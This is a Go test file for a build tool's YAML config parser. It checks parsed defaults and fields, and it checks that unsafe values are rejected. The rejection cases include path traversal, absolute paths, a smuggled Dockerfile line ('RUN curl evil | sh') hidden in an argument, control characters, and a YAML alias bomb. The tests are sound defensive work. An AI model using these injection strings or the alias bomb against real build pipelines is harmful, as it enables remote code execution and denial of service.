package build

import (
	"errors"
	"reflect"
	"strings"
	"testing"
	"time"
)

func TestParseConfigDefaults(t *testing.T) {
	for _, in := range []string{"", "   \n", "# only a comment\n", "---\n"} {
		cfg, err := ParseConfig([]byte(in))
		if err != nil {
			t.Fatalf("%q: %v", in, err)
		}
		if !reflect.DeepEqual(cfg, Config{Root: "."}) {
			t.Fatalf("%q: %+v", in, cfg)
		}
	}
}

func TestParseConfigFull(t *testing.T) {
	cfg, err := ParseConfig([]byte(`
root: ./games/arena/
server:
  package: ./cmd/arena
  args: ["-assets", "web/dist", "--name=it's \"quoted\""]
web:
  dir: client
  build: npm run build:prod
  dist: client/dist
`))
	if err != nil {
		t.Fatal(err)
	}
	want := Config{
		Root:   "games/arena",
		Server: ServerConfig{Package: "cmd/arena", Args: []string{"-assets", "web/dist", `--name=it's "quoted"`}},
		Web:    WebConfig{Dir: "client", Build: []string{"npm", "run", "build:prod"}, Dist: "client/dist"},
	}
	if !reflect.DeepEqual(cfg, want) {
		t.Fatalf("got %+v\nwant %+v", cfg, want)
	}
	cfg, err = ParseConfig([]byte("web:\n  build: [node, build.mjs, --mode, \"a b\"]\ndockerfile: deploy/Dockerfile\nserver:\n  package: .\n"))
	if err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(cfg.Web.Build, []string{"node", "build.mjs", "--mode", "a b"}) || cfg.Dockerfile != "deploy/Dockerfile" || cfg.Server.Package != "." {
		t.Fatalf("%+v", cfg)
	}
}

func wantUserErr(t *testing.T, err error, contains string) {
	t.Helper()
	var ue *UserError
	if !errors.As(err, &ue) {
		t.Fatalf("want *UserError containing %q, got %v", contains, err)
	}
	if !strings.Contains(ue.Msg, contains) {
		t.Fatalf("message %q lacks %q", ue.Msg, contains)
	}
	for _, r := range ue.Msg {
		if r == '\n' || r == '\r' || r < 0x20 {
			t.Fatalf("message contains a control character: %q", ue.Msg)
		}
	}
}

func TestParseConfigRejects(t *testing.T) {
	cases := map[string]string{
		"unknown top-level key":     "rot: .\n",
		"unknown nested key":        "server:\n  pkg: ./cmd/x\n",
		"unknown web key":           "web:\n  output: dist\n",
		"two documents":             "root: a\n---\nroot: b\n",
		"args not a list":           "server:\n  args: -x\n",
		"build is a map":            "web:\n  build: {a: b}\n",
		"build is a number":         "web:\n  build: 3\n",
		"build list of maps":        "web:\n  build: [{a: b}]\n",
		"empty build":               "web:\n  build: \"\"\n",
		"invalid yaml":              "root: [\n",
		"parent root":               "root: ../other\n",
		"traversal inside":          "root: a/../../b\n",
		"absolute root":             "root: /etc\n",
		"windows absolute":          "root: C:/Windows\n",
		"drive relative":            "root: C:x\n",
		"backslash":                 "root: a\\b\n",
		"git dir":                   "root: .git\n",
		"git dir nested":            "web:\n  dist: build/.GIT/hooks\n",
		"dash segment":              "root: -rf\n",
		"double slash":              "root: a//b\n",
		"space":                     "root: \"a b\"\n",
		"dollar":                    "web:\n  dist: $HOME\n",
		"quote":                     "web:\n  dist: \"a'b\"\n",
		"double quote":              "web:\n  dir: \"a\\\"b\"\n",
		"semicolon":                 "server:\n  package: \"a;b\"\n",
		"newline in path":           "web:\n  dist: \"a\\nRUN evil\"\n",
		"trailing dot":              "root: \"a.\"\n",
		"dist is root":              "web:\n  dist: .\n",
		"dockerfile is root":        "dockerfile: ./\n",
		"newline in arg":            "server:\n  args: [\"ok\", \"\\\"]\\nRUN curl evil | sh\"]\n",
		"cr in build word":          "web:\n  build: [\"npm\", \"run\\rx\"]\n",
		"nul in arg":                "server:\n  args: [\"a\\0b\"]\n",
		"bidi in arg":               "server:\n  args: [\"a\u202eb\"]\n",
		"esc in build":              "web:\n  build: \"npm \\e[31m\"\n",
		"line separator":            "server:\n  args: [\"a\u2028b\"]\n",
		"too many args":             "server:\n  args: [" + strings.Repeat("a,", maxWords) + "a]\n",
		"word too long":             "server:\n  args: [" + strings.Repeat("a", maxWordBytes+1) + "]\n",
		"deep path":                 "root: " + strings.Repeat("a/", maxPathDepth) + "a\n",
		"long path":                 "root: " + strings.Repeat("a", maxPathBytes+1) + "\n",
		"invalid utf8":              "root: \xff\n",
		"null package":              "server:\n  package: [x]\n",
		"anchor alias bomb partial": "a: &a [x]\nroot: *a\n",
	}
	for name, in := range cases {
		t.Run(name, func(t *testing.T) {
			_, err := ParseConfig([]byte(in))
			var ue *UserError
			if !errors.As(err, &ue) {
				t.Fatalf("want *UserError, got %v", err)
			}
			if strings.ContainsAny(ue.Msg, "\n\r\x00") {
				t.Fatalf("message not single line: %q", ue.Msg)
			}
			if strings.Contains(ue.Msg, "rawConfig") || strings.Contains(ue.Msg, "build.") {
				t.Fatalf("message names Go types: %q", ue.Msg)
			}
		})
	}
}

func TestParseConfigSizeAndAliasBomb(t *testing.T) {
	_, err := ParseConfig([]byte("root: ." + strings.Repeat(" ", maxConfigBytes)))
	wantUserErr(t, err, "larger than")
	bomb := `a: &a ["x","x","x","x","x","x","x","x","x"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
server:
  args: *h
`
	done := make(chan error, 1)
	go func() { _, err := ParseConfig([]byte(bomb)); done <- err }()
	select {
	case err := <-done:
		if err == nil {
			t.Fatal("alias bomb accepted")
		}
	case <-time.After(10 * time.Second):
		t.Fatal("alias bomb not refused in time")
	}
}

func TestCleanPath(t *testing.T) {
	ok := map[string]string{".": ".", "": ".", "./": ".", "a": "a", "./a/b/": "a/b", ".output/x_y-z.1": ".output/x_y-z.1"}
	for in, want := range ok {
		got, err := cleanPath("f", in, true)
		if err != nil || got != want {
			t.Errorf("cleanPath(%q) = %q, %v; want %q", in, got, err, want)
		}
	}
}
